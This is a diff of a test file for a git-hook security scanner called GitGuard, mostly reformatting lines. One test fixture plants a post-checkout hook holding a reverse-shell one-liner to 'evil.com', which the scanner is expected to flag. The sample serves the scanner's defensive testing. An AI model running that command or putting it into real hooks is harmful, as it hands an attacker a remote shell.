@@ -3,12 +3,13 @@
 # Protected by common law trademark rights. Federal trademark registration pending.
 # Unauthorized reproduction, distribution, or use of the AgentShroud name or brand is strictly prohibited.
 """Test Git Hook Guard."""
-from __future__ import annotations
 
+from __future__ import annotations
 
 import os
 import stat
 import tempfile
+
 from gateway.security.git_guard import GitGuard
 
 
@@ -35,16 +36,11 @@ class TestGitGuard:
             guard = GitGuard()
             findings = guard.scan_git_repository(d)
             assert len(findings) >= 1
-            assert any(
-                "curl" in str(f).lower() or "outbound" in str(f).lower()
-                for f in findings
-            )
+            assert any("curl" in str(f).lower() or "outbound" in str(f).lower() for f in findings)
 
     def test_reverse_shell_flagged(self):
         with tempfile.TemporaryDirectory() as d:
-            self._make_hook(
-                d, "post-checkout", "bash -i >& /dev/tcp/evil.com/8080 0>&1"
-            )
+            self._make_hook(d, "post-checkout", "bash -i >& /dev/tcp/evil.com/8080 0>&1")
             guard = GitGuard()
             findings = guard.scan_git_repository(d)
             assert len(findings) >= 1
